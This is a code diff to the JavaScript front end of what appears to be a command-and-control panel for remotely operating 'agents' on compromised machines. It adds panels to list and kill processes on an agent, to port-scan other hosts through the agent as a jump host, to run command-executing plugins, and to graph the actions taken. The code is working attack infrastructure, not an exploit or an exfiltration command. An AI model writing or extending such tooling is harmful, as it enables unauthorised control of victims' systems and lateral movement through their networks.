@@ -259,6 +259,9 @@ function switchTab(name) {
   if (name === "scan")      onScanTab();
   if (name === "builder")   onBuilderTab();
   if (name === "sysinfo") { onSysInfoTab(); onSensitiveTab(); }
+  if (name === "proc") { procRefresh(); }
+  if (name === "plugins") { pluginsRefresh(); }
+  if (name === "graph") { graphRefresh(); }
   if (name === "settings") { _settingsReady = false; loadSettings(); loadWorkerAdmin(); }
   if (name === "upgrade")   loadUpgradeFields();
   if (name === "tunnel")    loadTunnelConfig();
@@ -941,7 +944,8 @@ function filesGo(path) {
 async function filesRefresh(gen = null, force = false) {
   if (!S.selectedAgent) return;
   const myGen = gen ?? S.agentGen;
-  const path = document.getElementById("files-path").value.trim() || (_isWinAgent() ? _winHome() : "/");
+  let path = document.getElementById("files-path").value.trim() || (_isWinAgent() ? _winHome() : "/");
+  if (_isWinAgent() && !/^\w:[\/]/.test(path)) path = _winHome();
   const key  = filesAgentKey();
   if (key) localStorage.setItem(key, path);
 
@@ -4275,4 +4279,131 @@ async function downloadConsoleBackup() {
   } finally {
     if (btn) btn.disabled = false;
   }
+}
+
+
+/* ═════════ FORANG 功能面板：进程 / 网络探测 / 插件 / 链路图 ═════════ */
+
+function _agentOrToast() {
+  if (!S.selectedAgent) { toast("先在左侧选择 Agent", "error"); return null; }
+  return S.selectedAgent.id;
+}
+
+async function _capi(path, opts) {
+  const r = await fetch(path, opts);
+  const d = await r.json().catch(() => ({}));
+  if (!r.ok) { toast(d.error || ("HTTP " + r.status), "error"); return null; }
+  return d;
+}
+
+// ── 进程 ──
+async function procRefresh() {
+  const aid = _agentOrToast(); if (!aid) return;
+  const tbody = document.getElementById("proc-tbody");
+  tbody.innerHTML = '<tr><td colspan="4" style="padding:16px;text-align:center;opacity:.55">加载中…</td></tr>';
+  const d = await _capi(`/api/c2x/proc?agent_id=${encodeURIComponent(aid)}`);
+  if (!d) return;
+  if (!d.procs?.length) {
+    tbody.innerHTML = '<tr><td colspan="4" style="padding:16px;text-align:center;opacity:.55">无进程数据</td></tr>';
+    return;
+  }
+  tbody.innerHTML = d.procs.map(p => `
+    <tr style="border-top:1px solid var(--border)">
+      <td style="padding:4px 12px;font-family:var(--mono)">${esc(p.pid)}</td>
+      <td style="padding:4px 12px;font-family:var(--mono);max-width:520px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(p.name || p.cmd || "")}">${esc(p.name || p.cmd || "")}</td>
+      <td style="padding:4px 12px;opacity:.7;font-family:var(--mono)">${esc(p.mem || "")}</td>
+      <td><button class="btn-sm btn-danger" onclick="procKill('${esc(p.pid)}')">Kill</button></td>
+    </tr>`).join("");
+}
+
+async function procKill(pid) {
+  const aid = _agentOrToast(); if (!aid) return;
+  if (!confirm(`Kill 进程 ${pid}？`)) return;
+  const d = await _capi("/api/c2x/proc/kill", {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ agent_id: aid, pid }),
+  });
+  if (d) { toast(d.output || "done", "info"); setTimeout(procRefresh, 1500); }
+}
+
+// ── 网络探测 ──
+async function netScan() {
+  const aid = _agentOrToast(); if (!aid) return;
+  const host = document.getElementById("net-host").value.trim() || "127.0.0.1";
+  const ports = document.getElementById("net-ports").value.split(",").map(x => parseInt(x.trim())).filter(n => n > 0 && n < 65536);
+  if (!ports.length) { toast("端口列表为空", "error"); return; }
+  const out = document.getElementById("net-out");
+  out.textContent = `[*] 扫描 ${host}（${ports.length} 端口，目标机为跳板）…`;
+  const d = await _capi("/api/c2x/net/scan", {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ agent_id: aid, host, ports }),
+  });
+  out.textContent = d ? (d.output || "（无输出）") : "[!] 扫描失败";
+}
+
+async function netNetstat() {
+  const aid = _agentOrToast(); if (!aid) return;
+  const out = document.getElementById("net-out");
+  out.textContent = "[*] 获取中…";
+  const d = await _capi("/api/c2x/net/netstat", {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ agent_id: aid }),
+  });
+  out.textContent = d ? (d.output || "（无输出）") : "[!] 失败";
+}
+
+// ── 插件 ──
+async function pluginsRefresh() {
+  const list = document.getElementById("plugin-list");
+  const d = await _capi("/api/c2x/plugins");
+  if (!d) return;
+  if (!d.plugins?.length) {
+    list.innerHTML = '<div style="opacity:.55;padding:12px">无插件</div>';
+    return;
+  }
+  list.innerHTML = d.plugins.map(pl => `
+    <div style="display:flex;align-items:center;gap:12px;padding:10px 14px;background:var(--bg-2);border:1px solid var(--border);border-radius:6px">
+      <div style="flex:1;min-width:0">
+        <div style="font-weight:600">${esc(pl.name)} ${pl.builtin ? '<span class="agent-chip">内置</span>' : ""}</div>
+        <div style="font-size:11px;opacity:.65">${esc(pl.description || "")}</div>
+      </div>
+      <button class="btn-primary" style="padding:5px 14px" onclick="pluginRun(${pl.id}, '${esc(pl.name)}')">▶ 执行</button>
+    </div>`).join("");
+}
+
+async function pluginRun(id, name) {
+  const aid = _agentOrToast(); if (!aid) return;
+  const out = document.getElementById("plugin-out");
+  out.style.display = "block";
+  out.textContent = `[*] 插件「${name}」执行中…`;
+  const d = await _capi("/api/c2x/plugins/run", {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ agent_id: aid, plugin_id: id }),
+  });
+  if (!d) return;
+  const ok = (d.steps || []).filter(s => !s.error).length;
+  out.textContent = `「${d.plugin}」 ${ok}/${(d.steps || []).length} 条成功\n\n` +
+    (d.steps || []).map(s => `$ ${s.cmd}  (${s.ms}ms)\n${s.error ? "[!] " + s.error : (s.output || "").slice(0, 3000)}\n`).join("\n");
+}
+
+// ── 链路图 ──
+async function graphRefresh() {
+  const aid = _agentOrToast(); if (!aid) return;
+  const list = document.getElementById("graph-list");
+  const d = await _capi(`/api/c2x/graph?agent_id=${encodeURIComponent(aid)}`);
+  if (!d) return;
+  if (!d.nodes?.length) {
+    list.innerHTML = '<div style="opacity:.55;padding:12px">图暂空——执行命令/插件/采集后动作会自动入图</div>';
+    return;
+  }
+  const typeColor = { beacon: "#8b949e", action: "#58a6ff", plugin: "#d2a8ff", collect: "#3fb950", schedule: "#d29922" };
+  list.innerHTML = d.nodes.map(n => `
+    <div style="display:flex;gap:12px;padding:10px 14px;background:var(--bg-2);border:1px solid var(--border);border-radius:6px">
+      <span style="flex-shrink:0;font-size:10px;font-weight:700;color:#fff;background:${typeColor[n.type] || "#888"};border-radius:4px;padding:2px 8px;height:fit-content">${esc(n.type)}</span>
+      <div style="flex:1;min-width:0">
+        <div style="font-size:12px;font-weight:600">${esc(n.label)} ${n.status === "failed" ? '<span style="color:#f85149">✗</span>' : ""}</div>
+        ${n.detail ? `<pre style="margin:4px 0 0;font-size:10px;opacity:.6;white-space:pre-wrap;max-height:120px;overflow:auto;font-family:var(--mono)">${esc(n.detail.slice(0, 800))}</pre>` : ""}
+      </div>
+      <span style="flex-shrink:0;font-size:10px;opacity:.5">${esc(n.at || "")}</span>
+    </div>`).join("");
 }
